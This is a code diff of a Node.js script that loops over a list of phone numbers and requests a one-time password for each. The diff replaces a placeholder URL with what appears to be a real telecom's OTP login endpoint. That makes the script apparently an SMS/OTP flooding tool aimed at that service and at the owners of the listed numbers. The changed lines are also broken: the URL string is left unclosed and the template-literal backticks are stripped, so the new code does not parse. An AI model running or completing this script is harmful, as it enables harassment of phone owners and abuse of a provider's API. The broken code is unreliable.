@@ -1,7 +1,7 @@
 const fetch = require("node-fetch");
 const phones = require("./phones.json");
 
-const API_URL = "https://example.com/api/send-otp?phoneNumber="; // replace with real endpoint
+const API_URL = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=
 
 async function sendOtp(phone) {
   try {
@@ -9,9 +9,9 @@ async function sendOtp(phone) {
       method: "GET"
     });
     const text = await res.text();
-    console.log(`[${phone}] => ${res.status} ${text}`);
+    console.log([${phone}] => ${res.status} ${text});
   } catch (err) {
-    console.error(`[${phone}] Error:`, err.message);
+    console.error([${phone}] Error:, err.message);
   }
 }
 
